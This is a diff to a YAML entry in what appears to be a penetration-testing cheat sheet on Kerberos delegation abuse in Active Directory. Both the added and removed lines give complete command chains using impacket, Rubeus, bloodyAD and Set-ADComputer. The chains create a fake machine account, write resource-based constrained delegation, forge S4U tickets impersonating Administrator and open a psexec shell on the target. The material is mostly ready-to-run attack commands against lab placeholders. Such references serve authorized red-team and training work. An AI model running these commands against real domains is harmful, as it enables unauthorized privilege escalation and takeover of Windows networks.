@@ -1,40 +1,38 @@
 ---
 description: |
-  Kerberos delegation abuse — exploit unconstrained, constrained, and resource-based constrained delegation (RBCD) to impersonate users.
+  Kerberos delegation abuse — exploit constrained and resource-based constrained delegation (RBCD) to impersonate users.
 commands:
   - have: Credentials
     cmd: |
-      # Find delegation settings in the domain
+      # Find delegation settings
       impacket-findDelegation senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27
 
-      # RBCD — add a computer account for resource-based constrained delegation
-      impacket-addcomputer senshu.sh/sec_user:'P@ssw0rd' -computer-name 'FAKEPC$' -computer-pass 'FakeP@ss123' -dc-ip 10.10.10.27
-
-      # RBCD — configure delegation from fake computer to target
-      impacket-rbcd senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -action write -delegate-from 'FAKEPC$' -delegate-to 'TARGET$'
-
-      # RBCD — request service ticket via S4U
-      impacket-getST senshu.sh/'FAKEPC$':'FakeP@ss123' -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27
-
-      # Rubeus — S4U for constrained delegation
+      # --- Constrained Delegation ---
       .\Rubeus.exe s4u /user:sec_user /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.sh /ptt
-  - have: TGT
-    cmd: |
-      # Use TGT for constrained delegation exploitation
-      export KRB5CCNAME=ticket.ccache
 
-      # Request service ticket impersonating admin (Kerberos only)
-      impacket-getST senshu.sh/sec_user -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27 -k -no-pass
+      # --- RBCD (need write access to msDS-AllowedToActOnBehalfOfOtherIdentity) ---
+      # Create machine account + set RBCD + get ticket
+      impacket-addcomputer senshu.sh/sec_user:'P@ssw0rd' -computer-name 'FAKE01$' -computer-pass 'FakePass123' -dc-ip 10.10.10.27
+      impacket-rbcd senshu.sh/sec_user:'P@ssw0rd' -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -dc-ip 10.10.10.27 -action write
+      # or bloodyAD:
+      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add rbcd 'TARGET$' 'FAKE01$'
+      impacket-getST senshu.sh/'FAKE01$':'FakePass123' -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27
 
-      # Access target with impersonated ticket
-      export KRB5CCNAME=Administrator@cifs_TARGET.senshu.sh@SENSHU.SH.ccache
+      # Use the ticket
+      export KRB5CCNAME=Administrator.ccache
       impacket-psexec senshu.sh/Administrator@TARGET.senshu.sh -k -no-pass
+  - have: Shell
+    cmd: |
+      # RBCD from Windows
+      Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$
+      .\Rubeus.exe s4u /user:FAKE01$ /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.sh /ptt
 phase:
   - Exploitation
 target_os:
   - Windows
 services:
   - Kerberos
+  - LDAP
 techniques:
   - Delegation_Abuse
 references:
